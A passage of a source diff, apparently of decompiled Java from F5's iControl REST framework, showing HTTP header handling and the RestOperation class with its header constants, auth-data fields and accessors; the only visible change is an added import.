});\r\n     HEADER_HANDLERS.put(\"Cookie\".toUpperCase(), new HeaderHandler()\r\n         {\r\n\r\n\r\n           public void processHeaderValue(String headerValue, RestOperation op)\r\n           {\r\n             if (headerValue.endsWith(\";\")) {\r\n               headerValue = headerValue + \" \";\r\n             }\r\n             if (!headerValue.endsWith(\"; \")) {\r\n               headerValue = headerValue + \"; \";\r\n             }\r\n             HttpParserHelper.parseCookieJarElements(op, headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"WWW-Authenticate\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setWwwAuthenticate(headerValue);\r\n           }\r\n         });\r\n     HEADER_HANDLERS.put(\"X-F5-REST-Coordination-Id\".toUpperCase(), new HeaderHandler()\r\n         {\r\n           public void processHeaderValue(String headerValue, RestOperation op) {\r\n             op.setCoordinationId(headerValue);\r\n           }\r\n         });\r\n   }\r\n\r\n\r\n   public static void setHostIpAddress(HttpServletRequest request, RestOperation operation) {\r\n     if (request == null || operation == null) {\r\n       return;\r\n     }\r\n\r\n     if (operation.getAdditionalHeader(\"X-Forwarded-Host\") == null || operation.getAdditionalHeader(\"X-Forwarded-Host\").isEmpty()) {\r\n\r\n\r\n       String requestUrl = request.getRequestURL().toString();\r\n       String hostIpAddress = \"localhost\";\r\n       if (requestUrl != null && requestUrl.contains(\"://\")) {\r\n\r\n\r\n         requestUrl = requestUrl.split(\"://\")[1];\r\n         hostIpAddress = requestUrl.split(\"/\")[0];\r\n       }\r\n       operation.addAdditionalHeader(\"X-Forwarded-Host\", hostIpAddress);\r\n     }\r\n   }\r\n\r\n   private RestOperation createRestOperationFromServletRequest(HttpServletRequest request) throws URISyntaxException {\r\n     String port = getInitParameter(\"port\");\r\n     String fullUrl = getFullURL(request);\r\n\r\n     URI targetUri = new URI(String.format(\"%s%s:%s%s\", new Object[] { \"http://\", \"localhost\", port, fullUrl }));\r\n\r\n\r\n\r\n\r\n\r\n     RestOperation op = RestOperation.create().setMethod(RestOperation.RestMethod.valueOf(request.getMethod().toUpperCase())).setUri(targetUri);\r\n\r\n\r\n\r\n     Enumeration<String> headerNames = request.getHeaderNames();\r\n     while (headerNames.hasMoreElements()) {\r\n       String headerName = headerNames.nextElement();\r\n       String headerValue = request.getHeader(headerName);\r\n       if (RestOperation.isStandardHeader(headerName)) {\r\n         if (headerValue == null) {\r\n           this.logger.warning(headerName + \" doesn't have value, so skipping\");\r\n           continue;\r\n         }\r\n         HeaderHandler headerHandler = HEADER_HANDLERS.get(headerName.toUpperCase());\r\n         if (headerHandler != null) {\r\n           headerHandler.processHeaderValue(headerValue, op);\r\n         }\r\n         continue;\r\n       }\r\n       op.addAdditionalHeader(headerName, headerValue);\r\n     }\r\n\r\n\r\n\r\n\r\n\r\n\r\n     if (fullUrl.substring(1).startsWith(\"mgmt\")) {\r\n       setHostIpAddress(request, op);\r\n     }\r\n\r\n     return op;\r\n   }\r\n\r\n   private static interface HeaderHandler {\r\n     void processHeaderValue(String param1String, RestOperation param1RestOperation);\r\n   }\r\n }\r\ndiff --git a/com/f5/rest/common/RestOperation.java b/com/f5/rest/common/RestOperation.java\r\nindex ee882d4..fc91fdd 100644\r\n--- a/com/f5/rest/common/RestOperation.java\r\n+++ b/com/f5/rest/common/RestOperation.java\r\n@@ -1,2875 +1,2876 @@\r\n package com.f5.rest.common;\r\n\r\n import com.f5.rest.workers.AuthTokenItemState;\r\n import com.f5.rest.workers.authz.AuthzHelper;\r\n import com.google.gson.Gson;\r\n import com.google.gson.GsonBuilder;\r\n import com.google.gson.JsonElement;\r\n import com.google.gson.JsonObject;\r\n import com.google.gson.JsonParser;\r\n import com.google.gson.JsonSyntaxException;\r\n import java.io.Reader;\r\n import java.lang.reflect.Type;\r\n import java.net.SocketAddress;\r\n import java.net.URI;\r\n import java.nio.charset.StandardCharsets;\r\n import java.security.cert.Certificate;\r\n import java.util.ArrayList;\r\n import java.util.Date;\r\n import java.util.EnumSet;\r\n import java.util.HashMap;\r\n import java.util.HashSet;\r\n+import java.util.Iterator;\r\n import java.util.List;\r\n import java.util.Map;\r\n import java.util.Set;\r\n import java.util.concurrent.atomic.AtomicInteger;\r\n import java.util.concurrent.atomic.AtomicLong;\r\n import java.util.logging.Level;\r\n import javax.xml.bind.DatatypeConverter;\r\n import org.joda.time.DateTime;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n public class RestOperation\r\n   implements Cloneable\r\n {\r\n   public static class HttpException\r\n     extends Exception\r\n   {\r\n     private static final long serialVersionUID = 1L;\r\n\r\n     public HttpException(String message) {\r\n       super(message);\r\n     }\r\n   }\r\n\r\n   private static final RestLogger LOGGER = new RestLogger(RestOperation.class, \"\");\r\n\r\n   public static final int STATUS_OK = 200;\r\n\r\n   public static final int STATUS_CREATED = 201;\r\n\r\n   public static final int STATUS_ACCEPTED = 202;\r\n\r\n   public static final int STATUS_NO_CONTENT = 204;\r\n\r\n   public static final int STATUS_PARTIAL_CONTENT = 206;\r\n\r\n   public static final int STATUS_FOUND = 302;\r\n\r\n   public static final int STATUS_BAD_REQUEST = 400;\r\n   public static final int STATUS_FAILURE_THRESHOLD = 400;\r\n   public static final int STATUS_UNAUTHORIZED = 401;\r\n   public static final int STATUS_FORBIDDEN = 403;\r\n   public static final int STATUS_NOT_FOUND = 404;\r\n   public static final int STATUS_METHOD_NOT_ALLOWED = 405;\r\n   public static final int STATUS_NOT_ACCEPTABLE = 406;\r\n   public static final int STATUS_CONFLICT = 409;\r\n   public static final int STATUS_INTERNAL_SERVER_ERROR = 500;\r\n   public static final int STATUS_NOT_IMPLEMENTED = 501;\r\n   public static final int STATUS_BAD_GATEWAY = 502;\r\n   public static final int STATUS_SERVICE_UNAVAILABLE = 503;\r\n   public static final int STATUS_INSUFFICIENT_STORAGE = 507;\r\n   public static final String REMOTE_SENDER_IN_PROCESS = \"InProcess\";\r\n   public static final String REMOTE_SENDER_UNKNOWN = \"Unknown\";\r\n   public static final String EMPTY_JSON_BODY = \"{}\";\r\n   public static final long UNKNOWN_CONTENT_LENGTH = -1L;\r\n   public static String WILDCARD = \"*\";\r\n   public static String WILDCARD_PATH = \"/\" + WILDCARD;\r\n\r\n\r\n\r\n   private Certificate[] serverCertificateChain;\r\n\r\n\r\n\r\n\r\n   public static class ParsedCollectionEntry\r\n   {\r\n     public String collectionName;\r\n\r\n\r\n\r\n     public String entryKey;\r\n   }\r\n\r\n\r\n\r\n\r\n   public enum RestMethod\r\n   {\r\n     GET, POST, PUT, DELETE, PATCH, OPTIONS;\r\n\r\n     private static final String[] methodHandlerNames = new String[] { \"onGet\", \"onPost\", \"onPut\", \"onDelete\", \"onPatch\", \"onOptions\" };\r\n     static {\r\n\r\n     }\r\n\r\n     public String getMethodHandlerName() {\r\n       return methodHandlerNames[ordinal()];\r\n     }\r\n   }\r\n\r\n\r\n\r\n\r\n   public enum RestOperationFlags\r\n   {\r\n     IDENTIFIED,\r\n\r\n     VERIFIED;\r\n   }\r\n\r\n   public static boolean contentTypeEquals(String mediaTypeA, String mediaTypeB) {\r\n     return (mediaTypeA.hashCode() == mediaTypeB.hashCode());\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public Certificate[] getServerCertificateChain() {\r\n     return this.serverCertificateChain;\r\n   }\r\n\r\n   RestOperation setServerCertificateChain(Certificate[] certificates) {\r\n     this.serverCertificateChain = certificates;\r\n     return this;\r\n   }\r\n\r\n\r\n   protected static final AtomicInteger maxMessageBodySize = new AtomicInteger(33554432);\r\n\r\n\r\n\r\n   protected static final AtomicInteger defaultMessageBodySize = new AtomicInteger(16384);\r\n\r\n\r\n   private static Gson gson = allocateGson(false);\r\n   private static Gson extendedGson = allocateGson(true); public static final String HTTP_HEADER_FIELD_VALUE_SEPARATOR = \":\"; public static final String X_F5_REST_COORDINATION_ID_HEADER = \"X-F5-REST-Coordination-Id\"; public static final String X_F5_REST_COORDINATION_ID_HEADER_WITH_COLON = \"X-F5-REST-Coordination-Id:\"; public static final String X_FORWARDED_FOR_HEADER = \"X-Forwarded-For\"; public static final String X_FORWARDED_FOR_HEADER_WITH_COLON = \"X-Forwarded-For:\"; public static final String X_F5_AUTH_TOKEN_HEADER = \"X-F5-Auth-Token\"; public static final String X_F5_AUTH_TOKEN_HEADER_WITH_COLON = \"X-F5-Auth-Token:\"; public static final String X_AUTH_TOKEN_HEADER = \"X-Auth-Token\"; public static final String X_AUTH_TOKEN_HEADER_WITH_COLON = \"X-Auth-Token:\"; public static final String X_F5_GOSSIP_HEADER = \"X-F5-Gossip\"; public static final String X_F5_GOSSIP_HEADER_WITH_COLON = \"X-F5-Gossip:\"; public static final String BASIC_REALM_REST_API = \"Basic realm='REST API'\"; public static final String WWW_AUTHENTICATE_HEADER = \"WWW-Authenticate\"; public static final String WWW_AUTHENTICATE_HEADER_WITH_COLON = \"WWW-Authenticate:\";\r\n\r\n   static Gson getGson() {\r\n     return gson;\r\n   }\r\n   public static final String HOST_HEADER = \"Host\"; public static final String CONNECTION_HEADER = \"Connection\"; public static final String CONTENT_TYPE_HEADER = \"Content-Type\"; public static final String CONTENT_DISPOSITION_HEADER = \"Content-Disposition\"; public static final String CONTENT_LENGTH_HEADER = \"Content-Length\"; public static final String CONTENT_RANGE_HEADER = \"Content-Range\"; public static final String USER_AGENT_HEADER = \"User-Agent\"; public static final String SET_COOKIE_HEADER = \"Set-Cookie\"; public static final String DATE_HEADER = \"Date\"; public static final String SERVER_HEADER = \"Server\"; public static final String CACHE_CONTROL_HEADER = \"Cache-Control\"; public static final String PRAGMA_HEADER = \"Pragma\"; public static final String EXPIRES_HEADER = \"Expires\"; public static final String ACCEPT_HEADER = \"Accept\";\r\n   static Gson getExtendedGson() {\r\n     return extendedGson;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private static Gson allocateGson(boolean makeExtendedGson) {\r\n     GsonBuilder bldr = (new GsonBuilder()).disableHtmlEscaping().setDateFormat(\"yyyy-MM-dd'T'HH:mm:ss.SSSZ\").registerTypeAdapter(DateTime.class, new DateTimeTypeAdapter());\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n     if (makeExtendedGson) {\r\n       bldr.registerTypeHierarchyAdapter(RestWorkerState.class, new RestWorkerStateSerializer());\r\n     }\r\n\r\n     return bldr.create();\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static final int ACCEPT_HEADER_LENGTH = \"Accept\".length();\r\n\r\n   public static final String ACCESS_CONTROL_ALLOW_HEADERS_HEADER = \"Access-Control-Allow-Headers\";\r\n   public static final int ACCESS_CONTROL_ALLOW_HEADERS_HEADER_LENGTH = \"Access-Control-Allow-Headers\".length();\r\n\r\n   public static final String ACCESS_CONTROL_ALLOW_ORIGIN_HEADER = \"Access-Control-Allow-Origin\";\r\n   public static final int ACCESS_CONTROL_ALLOW_ORIGIN_HEADER_LENGTH = \"Access-Control-Allow-Origin\".length();\r\n\r\n   public static final String ACCESS_CONTROL_MAX_AGE_HEADER = \"Access-Control-Max-Age\";\r\n\r\n   public static final int ACCESS_CONTROL_MAX_AGE_HEADER_LENGTH = \"Access-Control-Max-Age\".length();\r\n\r\n   public static final String ACCESS_CONTROL_ALLOW_METHODS_HEADER = \"Access-Control-Allow-Methods\";\r\n\r\n   public static final int ACCESS_CONTROL_ALLOW_METHODS_HEADER_LENGTH = \"Access-Control-Allow-Methods\".length();\r\n\r\n\r\n   public static final String ACCESS_CONTROL_ALLOW_CREDENTIALS_HEADER = \"Access-Control-Allow-Credentials\";\r\n\r\n   public static final int ACCESS_CONTROL_ALLOW_CREDENTIALS_HEADER_LENGTH = \"Access-Control-Allow-Credentials\".length();\r\n\r\n\r\n   public static final String ACCESS_CONTROL_REQUEST_HEADERS_HEADER = \"Access-Control-Request-Headers\";\r\n\r\n   public static final int ACCESS_CONTROL_REQUEST_HEADERS_HEADER_LENGTH = \"Access-Control-Request-Headers\".length();\r\n\r\n   public static final String AUTHORIZATION_HEADER = \"Authorization\";\r\n\r\n   public static final String TRANSFER_ENCODING_HEADER = \"Transfer-Encoding\";\r\n\r\n   public static final String REFERER_HEADER = \"Referer\";\r\n\r\n   public static final String BASIC_AUTHORIZATION_HEADER = \"Authorization: Basic \";\r\n   public static final String BASIC_AUTHORIZATION_HEADER_LOWERCASE = \"Authorization: Basic \".toLowerCase();\r\n\r\n   public static final int BASIC_AUTHORIZATION_HEADER_LENGTH = \"Authorization: Basic \".length();\r\n\r\n   public static final String COOKIE_HEADER = \"Cookie\";\r\n   public static final int COOKIE_HEADER_LENGTH = \"Cookie\".length();\r\n\r\n   public static final String COOKIE_HEADER_VALUE_SEPARATOR = \";\";\r\n\r\n   public static final String TMUI_DUBBUF_HEADER = \"Tmui-Dubbuf\";\r\n\r\n   public static final String ALLOW_HEADER = \"Allow\";\r\n\r\n   public static final String LOCATION_HEADER = \"Location\";\r\n\r\n   public static final String X_F5_API_STATUS_HEADER = \"X-F5-Api-Status\";\r\n\r\n   public static final String X_F5_API_STATUS_HEADER_WITH_COLON = \"X-F5-Api-Status:\";\r\n\r\n   public static final String X_F5_CONFIG_API_STATUS_HEADER = \"X-F5-Config-Api-Status\";\r\n\r\n   public static final String X_F5_CONFIG_API_STATUS_HEADER_WITH_COLON = \"X-F5-Config-Api-Status:\";\r\n\r\n   public static final String X_F5_NEW_AUTHTOK_REQD_HEADER = \"X-F5-New-Authtok-Reqd\";\r\n\r\n   public static final String X_FORWARDED_HOST_HEADER = \"X-Forwarded-Host\";\r\n\r\n   public static final String X_REAL_IP_HEADER = \"X-Real-IP\";\r\n   private static final String[] STANDARD_HEADERS = new String[] { \"Cache-Control\", \"Pragma\", \"Expires\", \"Content-Type\", \"Content-Range\", \"Content-Disposition\", \"Content-Length\", \"Authorization\", \"X-F5-Auth-Token\", \"WWW-Authenticate\", \"X-Auth-Token\", \"X-Forwarded-For\", \"Referer\", \"X-F5-REST-Coordination-Id\", \"User-Agent\", \"Accept\", \"Connection\", \"Transfer-Encoding\", \"Host\", \"Date\", \"Server\", \"Connection\", \"Allow\", \"X-F5-Gossip\", \"X-F5-Api-Status\", \"X-F5-Config-Api-Status\" };\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   private static final HashSet<String> standardHeadersSet = getStandardHeadersSet(); public static final String CONNECTION_HEADER_VALUE_CLOSE = \"close\"; public static final String MIME_TYPE_APPLICATION_JSON = \"application/json\"; public static final String MIME_TYPE_APPLICATION_XML = \"application/xml\"; public static final String MIME_TYPE_APPLICATION_JAVASCRIPT = \"application/javascript\"; public static final String MIME_TYPE_APPLICATION_X_JAVASCRIPT = \"application/x-javascript\"; public static final String MIME_TYPE_TEXT_JAVASCRIPT = \"text/javascript\"; public static final String MIME_TYPE_TEXT_HTML = \"text/html\"; public static final String MIME_TYPE_TEXT_CSS = \"text/css\"; public static final String MIME_TYPE_TEXT_CSV = \"text/csv\"; public static final String MIME_TYPE_TEXT_XML = \"text/xml\"; public static final String MIME_TYPE_IMAGE_BMP = \"image/bmp\"; public static final String MIME_TYPE_IMAGE_GIF = \"image/gif\"; public static final String MIME_TYPE_IMAGE_JPEG = \"image/jpeg\"; public static final String MIME_TYPE_IMAGE_PNG = \"image/png\"; public static final String MIME_TYPE_IMAGE_SVG = \"image/svg+xml\"; public static final String MIME_TYPE_IMAGE_TIFF = \"image/tiff\";\r\n\r\n   private static HashSet<String> getStandardHeadersSet() {\r\n     HashSet<String> headerSet = new HashSet<>();\r\n     for (String header : STANDARD_HEADERS) {\r\n       headerSet.add(header.toLowerCase());\r\n     }\r\n\r\n     return headerSet;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static boolean isStandardHeader(String header) {\r\n     return standardHeadersSet.contains(header.toLowerCase());\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static final String MIME_ENCODING_UTF8 = StandardCharsets.UTF_8.name();\r\n\r\n   public static final String MIME_TYPE_APPLICATION_OCTET_STREAM = \"application/octet-stream\";\r\n\r\n   public static final String CHUNKED_TRANSFER_ENCODING = \"chunked\";\r\n\r\n   public static final String PORT_SEPARATOR = \":\";\r\n\r\n   public static final String PATH_SEPARATOR = \"/\";\r\n   public static final char PATH_SEPARATOR_CHAR = '/';\r\n   public static final String EMPTY_STRING = \"\";\r\n   public static final char QUERY_SEPARATOR = '?';\r\n   public static final String QUERY_SEPARATOR_STRING = Character.toString('?');\r\n\r\n\r\n   public static final char QUERY_PARAM_SEPARATOR = '&';\r\n\r\n   public static final char QUERY_EQUALS = '=';\r\n\r\n   public static final String QUERY_PARAM_SEPARATOR_STRING = \"&\";\r\n\r\n   public static final String GENERATION_QUERY_PARAM_NAME = \"generation\";\r\n\r\n   public static final String LAST_UPDATE_MICROS_QUERY_PARAM_NAME = \"lastUpdateMicros\";\r\n\r\n   static final int DEFAULT_RETRY_COUNT = 5;\r\n\r\n   private RestRequestCompletion completion;\r\n\r\n\r\n   public static RestOperation create() {\r\n     RestOperation self = new RestOperation();\r\n     self.restOperationFlags = EnumSet.noneOf(RestOperationFlags.class);\r\n     return self;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static RestOperation createIdentified() {\r\n     RestOperation self = create();\r\n\r\n\r\n     self.restOperationFlags.add(RestOperationFlags.IDENTIFIED);\r\n\r\n     return self;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static RestOperation createIdentified(RestOperation original) {\r\n     RestOperation copy = (RestOperation)original.clone();\r\n\r\n\r\n     copy.restOperationFlags.clear();\r\n\r\n\r\n     copy.restOperationFlags.add(RestOperationFlags.IDENTIFIED);\r\n\r\n     return copy.setXF5AuthToken(null);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static RestOperation createIdentified(String identifiedGroupName) {\r\n     RestOperation self = createIdentified();\r\n     self.identifiedGroupName = identifiedGroupName;\r\n     return self;\r\n   }\r\n\r\n\r\n\r\n\r\n   public static RestOperation createSigned() {\r\n     return create();\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public static RestOperation createSignedAndVerified() {\r\n     RestOperation self = create();\r\n     self.restOperationFlags.add(RestOperationFlags.VERIFIED);\r\n     return self;\r\n   }\r\n\r\n\r\n\r\n\r\n   private static class AuthorizationData\r\n   {\r\n     public String basicAuthValue;\r\n\r\n\r\n\r\n     public String xAuthToken;\r\n\r\n\r\n\r\n     public AuthTokenItemState xF5AuthTokenState;\r\n\r\n\r\n     public String wwwAuthenticate;\r\n\r\n\r\n\r\n     private AuthorizationData() {}\r\n   }\r\n\r\n\r\n\r\n   private static class IdentityData\r\n   {\r\n     public String userName;\r\n\r\n\r\n     public RestReference userReference;\r\n\r\n\r\n     public RestReference[] groupReferences;\r\n\r\n\r\n\r\n     private IdentityData() {}\r\n   }\r\n\r\n\r\n   private final HashMap<String, String> parameters = new HashMap<>();\r\n\r\n\r\n\r\n\r\n   private HttpHeaderFields[] additionalHeaders;\r\n\r\n\r\n\r\n   private static AtomicLong nextId = new AtomicLong(0L);\r\n\r\n   private final long id;\r\n\r\n   private URI uri;\r\n\r\n   private Date expiration = new Date(RestHelper.getCurrentTimeInMillis() + RestHelper.getOperationTimeoutMillis());\r\n\r\n\r\n   private RestMethod method;\r\n\r\n\r\n   private String incomingContentType;\r\n\r\n\r\n   private String contentType;\r\n\r\n   private String contentEncoding;\r\n\r\n   private String accept;\r\n\r\n   private String body;\r\n\r\n   private byte[] binaryBody;\r\n\r\n   private long contentLength = -1L;\r\n\r\n\r\n   private String contentRange;\r\n\r\n\r\n   private Object deserializedBody;\r\n\r\n\r\n   private Type deserializedBodyType;\r\n\r\n\r\n   private boolean isResponse;\r\n\r\n\r\n   private boolean isForceSocketEnabled;\r\n\r\n   private boolean isConnectionKeepAlive = true;\r\n\r\n   private boolean isConnectionCloseRequested;\r\n\r\n   private EnumSet<RestOperationFlags> restOperationFlags;\r\n\r\n   private String xForwardedFor;\r\n\r\n   private int retriesRemaining = 5;\r\n\r\n   private final AtomicInteger completionCount = new AtomicInteger(0);\r\n\r\n   private int httpHeaderByteCount;\r\n\r\n   private int statusCode = 200;\r\n\r\n\r\n   private AuthorizationData authorizationData;\r\n\r\n\r\n   private IdentityData identityData;\r\n\r\n\r\n   private String transferEncoding;\r\n\r\n\r\n   private List<ParsedCollectionEntry> parsedUriCollectionEntries;\r\n\r\n\r\n   private SocketAddress sourceAddress;\r\n\r\n\r\n   private String referer;\r\n\r\n\r\n   private String coordinationId;\r\n\r\n\r\n   private boolean isRollbackRequest;\r\n\r\n\r\n   private String contentDisposition;\r\n\r\n\r\n   private String identifiedGroupName;\r\n\r\n\r\n   private boolean isTrustedRequest;\r\n\r\n\r\n   private String allow;\r\n\r\n\r\n   private Boolean resourceDeprecated;\r\n\r\n\r\n   private Boolean resourceEarlyAccess;\r\n\r\n\r\n   private Boolean propertyDeprecated;\r\n\r\n\r\n   private Boolean propertyEarlyAccess;\r\n\r\n\r\n   private long xF5ConfigApiStatus;\r\n\r\n\r\n   private String origin;\r\n\r\n   private String senderNote;\r\n\r\n   private String gossipHeader;\r\n\r\n   private static final int DEFAULT_HEADER_BUFFER_SIZE = 256;\r\n\r\n   private StringBuilder responseHeadersTrace;\r\n\r\n   private volatile StringBuilder requestHeadersTrace;\r\n\r\n   private boolean isRestErrorResponseRequired = true;\r\n\r\n   private Boolean isPublicRequest;\r\n\r\n\r\n   public void setIsPublicRequestToTrue() {\r\n     this.isPublicRequest = Boolean.TRUE;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public boolean isPublicRequest() {\r\n     return (this.isPublicRequest != null && this.isPublicRequest.booleanValue());\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void appendResponseHeaderTrace(String headerLine) {\r\n     if (RestHelper.getOperationTracingLevel().intValue() > Level.FINER.intValue()) {\r\n       return;\r\n     }\r\n\r\n     if (this.responseHeadersTrace == null) {\r\n       this.responseHeadersTrace = new StringBuilder(256);\r\n     }\r\n     this.responseHeadersTrace.append(headerLine);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public void appendRequestHeaderTrace(String headerName, String headerValue) {\r\n     if (RestHelper.getOperationTracingLevel().intValue() > Level.FINER.intValue()) {\r\n       return;\r\n     }\r\n\r\n     if (this.requestHeadersTrace == null) {\r\n       this.requestHeadersTrace = new StringBuilder(256);\r\n     }\r\n     appendHeaderTrace(this.requestHeadersTrace, headerName, headerValue);\r\n   }\r\n\r\n\r\n   private void appendHeaderTrace(StringBuilder headersTraceBuilder, String headerName, String headerValue) {\r\n     headersTraceBuilder.append(headerName);\r\n     headersTraceBuilder.append(\": \");\r\n     headersTraceBuilder.append(headerValue);\r\n     headersTraceBuilder.append(\"\\n\");\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String getResponseHeadersTrace() {\r\n     return (RestHelper.getOperationTracingLevel().intValue() <= Level.FINER.intValue() && this.responseHeadersTrace != null) ? this.responseHeadersTrace.toString() : null;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String getRequestHeadersTrace() {\r\n     return (RestHelper.getOperationTracingLevel().intValue() <= Level.FINER.intValue() && this.requestHeadersTrace != null) ? this.requestHeadersTrace.toString() : null;\r\n   }\r\n\r\n\r\n   private RestOperation() {\r\n     this.id = nextId.getAndIncrement();\r\n   }\r\n\r\n\r\n\r\n   public String toString() {\r\n     return String.format(\"[\\n id=%s\\n referer=%s\\n uri=%s\\n method=%s\\n statusCode=%d\\n contentType=%s\\n contentLength=%d\\n contentRange=%s\\n deadline=%s\\n body=%s\\n forceSocket=%s\\n isResponse=%s\\n retriesRemaining=%s\\n coordinationId=%s\\n isConnectionCloseRequested=%s\\n isConnectionKeepAlive=%s\\n isRestErrorResponseRequired=%s\\n AdditionalHeadersAsString=\\n%s\\n ResponseHeadersTrace=%s\\n X-F5-Config-Api-Status=%d]\", new Object[] { Long.valueOf(this.id), this.referer, this.uri, getMethod(), Integer.valueOf(getStatusCode()), getContentType(), Long.valueOf(getContentLength()), getContentRange(), getExpiration(), getBodyAsString(), Boolean.valueOf(getForceSocket()), Boolean.valueOf(isResponse()), Integer.valueOf(getRetriesRemaining()), getCoordinationId(), Boolean.valueOf(isConnectionCloseRequested()), Boolean.valueOf(isConnectionKeepAlive()), Boolean.valueOf(isRestErrorResponseRequired()), getAdditionalHeadersAsString(\"  \"), (getResponseHeadersTrace() == null) ? \"\" : String.format(\" %s\\n\", new Object[] { getResponseHeadersTrace() }), Long.valueOf(getXF5ConfigApiStatus()) });\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public long getId() {\r\n     return this.id;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public String getReferer() {\r\n     return this.referer;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setReferer(String referer) {\r\n     this.referer = referer;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   public RestOperation setOneTryOnly() {\r\n     this.retriesRemaining = 1;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   int decrementRetriesRemaining() {\r\n     return --this.retriesRemaining;\r\n   }\r\n\r\n\r\n\r\n\r\n   int getRetriesRemaining() {\r\n     return this.retriesRemaining;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   void setRetriesRemaining(int retriesRemaining) {\r\n     this.retriesRemaining = retriesRemaining;\r\n   }\r\n\r\n\r\n\r\n\r\n   RestOperation clearRetriesRemaining() {\r\n     this.retriesRemaining = 0;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public int getCompletionCount() {\r\n     return this.completionCount.get();\r\n   }\r\n\r\n\r\n\r\n\r\n   void resetCompletionCount() {\r\n     this.completionCount.set(0);\r\n   }\r\n\r\n\r\n\r\n\r\n   public String getXForwarderdFor() {\r\n     return this.xForwardedFor;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n   public String getRemoteSender() {\r\n     if (this.xForwardedFor != null) {\r\n       return this.xForwardedFor;\r\n     }\r\n\r\n     if (this.referer != null) {\r\n       return this.referer;\r\n     }\r\n     return \"Unknown\";\r\n   }\r\n\r\n\r\n\r\n\r\n   public RestOperation setContentLength(long contentLength) {\r\n     this.contentLength = contentLength;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   public RestRequestCompletion getCompletion() {\r\n     return this.completion;\r\n   }\r\n\r\n\r\n\r\n\r\n   public boolean isConnectionKeepAlive() {\r\n     return this.isConnectionKeepAlive;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setConnectionKeepAlive(boolean isConnectionKeepAlive) {\r\n     this.isConnectionKeepAlive = isConnectionKeepAlive;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   public boolean isConnectionCloseRequested() {\r\n     return this.isConnectionCloseRequested;\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   public RestOperation setConnectionClose(boolean isConnectionCloseRequested) {\r\n     this.isConnectionCloseRequested = isConnectionCloseRequested;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   int getHttpHeaderByteCount() {\r\n     return this.httpHeaderByteCount;\r\n   }\r\n\r\n\r\n\r\n\r\n   RestOperation setHttpHeaderByteCount(int byteCount) {\r\n     this.httpHeaderByteCount = byteCount;\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   RestOperation flipToResponse(boolean clearBody) {\r\n     removeAdditionalHeader(\"Tmui-Dubbuf\");\r\n\r\n     this.isResponse = true;\r\n     this.parameters.clear();\r\n     this.httpHeaderByteCount = 0;\r\n\r\n     if (this.authorizationData != null) {\r\n       this.authorizationData.basicAuthValue = null;\r\n     }\r\n     if (clearBody) {\r\n       clearBody();\r\n     }\r\n     return this;\r\n   }\r\n\r\n\r\n\r\n\r\n   void clearBody() {\r\n     this.contentLength = -1L;\r\n     this.binaryBody = null;\r\n     this.body = null;\r\n     this.deserializedBody = null;\r\n     this.deserializedBodyType = null;\r\n   }\r\n\r\n   public boolean isResponse() {\r\n     return this.isResponse;\r\n   }\r\n\r\n   public RestOperation setForceSocket(boolean forceSocket) {\r\n     this.isForceSocketEnabled = forceSocket;\r\n     return this;\r\n   }\r\n\r\n   public boolean getForceSocket() {\r\n   